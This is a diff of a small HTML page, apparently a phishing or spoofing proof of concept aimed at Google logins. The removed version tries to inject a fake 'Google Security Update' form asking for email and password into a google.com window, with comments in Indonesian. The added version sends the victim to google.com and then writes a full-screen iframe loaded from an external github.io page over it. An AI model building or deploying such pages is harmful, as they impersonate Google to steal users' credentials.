@@ -1,36 +1,18 @@
-<!DOCTYPE html>
-<html>
-<body>
-<button onclick="advancedSpoof()">Continue to Service</button>
+
+<center><br><br><br><br><br><button style=font-size:60px onclick=x()>Login to Google</button>
 
 <script>
-function advancedSpoof() {
-    // Buka window dengan URL legitimate terlebih dahulu
-    const w = window.open('https://www.google.com', 'spoofWindow');
-    
-    setTimeout(() => {
-        // Gunakan postMessage untuk komunikasi cross-origin
-        w.postMessage('injectContent', '*');
-    }, 2000);
-    
-    // Listen untuk response (jika needed)
-    window.addEventListener('message', (event) => {
-        if (event.data === 'readyForInjection') {
-            // Execute script di target window
-            w.eval(`
-                document.body.innerHTML = \\`
-                <div style="padding: 40px; text-align: center;">
-                    <h2>Google Security Update</h2>
-                    <p>Your account requires re-authentication</p>
-                    <input type="email" placeholder="Email">
-                    <input type="password" placeholder="Password">
-                    <button>Secure Login</button>
-                </div>
-                \\`;
-            `);
-        }
-    });
+var t='';
+function x(){
+location='https://www.google.com/csi'
+
+
+setTimeout(()=>{
+
+document.write('<iframe src="https://sauceialist.github.io/dia/test3.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
+
+
+},1000);
+
 }
 </script>
-</body>
-</html>
